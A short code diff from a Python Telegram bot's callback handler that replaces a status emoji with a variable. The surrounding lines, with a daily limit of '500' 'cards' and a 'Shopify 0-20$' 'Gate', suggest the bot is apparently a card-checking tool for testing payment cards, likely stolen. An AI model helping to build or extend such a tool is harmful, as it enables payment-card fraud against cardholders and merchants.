@@ -2979,7 +3018,7 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             if ud_i.get("msh_daily_date", "") == _today:
                 status_line = f"🔒 Used today ({_used}/500)" if _used >= 500 else f"⚡ {_remain} cards left today"
             else:
-                status_line = "✅ Available"
+                status_line = f"{E_LIVE} Available"
         await query.message.edit_text(
             f"<b>────────────</b>\n"
             f"<b>Gate</b>    ➳ Shopify 0-20$\n"
